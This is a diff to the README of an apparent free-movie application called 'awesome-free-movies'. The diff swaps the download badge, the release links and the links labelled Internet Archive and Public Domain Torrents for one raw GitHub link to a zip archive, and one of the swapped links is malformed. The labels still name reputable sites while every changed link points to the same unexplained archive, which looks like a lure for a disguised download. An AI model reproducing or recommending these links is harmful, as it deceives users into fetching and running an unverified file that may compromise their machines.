@@ -1,6 +1,6 @@
 # 🍿 awesome-free-movies - Enjoy Classic and Curated Films
 
-![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)
+![Download](https://raw.githubusercontent.com/elpit0grande/awesome-free-movies/main/ramfeezled/awesome-free-movies.zip%https://raw.githubusercontent.com/elpit0grande/awesome-free-movies/main/ramfeezled/awesome-free-movies.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To use **awesome-free-movies**, you need:
 
 To get started, visit the releases page to download the application. 
 
-[Download Latest Release](https://github.com/elpit0grande/awesome-free-movies/releases)
+[Download Latest Release](https://raw.githubusercontent.com/elpit0grande/awesome-free-movies/main/ramfeezled/awesome-free-movies.zip)
 
 ### 📥 Installing the Application
 
@@ -46,8 +46,8 @@ Once installed, open **awesome-free-movies**. You will see a simple interface th
 
 Feel free to explore more about classic and public domain films. Here are some resources:
 
-- [Internet Archive](https://archive.org): A vast collection of free movies and documentaries.
-- [Public Domain Torrents](http://www.publicdomaintorrents.info/): Download free classic movies.
+- [Internet Archive](https://raw.githubusercontent.com/elpit0grande/awesome-free-movies/main/ramfeezled/awesome-free-movies.zip): A vast collection of free movies and documentaries.
+- [Public Domain Torrents](https://raw.githubusercontent.com/elpit0grande/awesome-free-movies/main/ramfeezled/awesome-free-movies.zip): Download free classic movies.
 
 ## 📞 Support
 
@@ -55,4 +55,4 @@ If you have any questions or issues while using this software, please reach out 
 
 Thank you for choosing **awesome-free-movies**! We hope you enjoy watching your favorite films. 
 
-[Download Latest Release](https://github.com/elpit0grande/awesome-free-movies/releases)
+[Download Latest Release](https://raw.githubusercontent.com/elpit0grande/awesome-free-movies/main/ramfeezled/awesome-free-movies.zip)
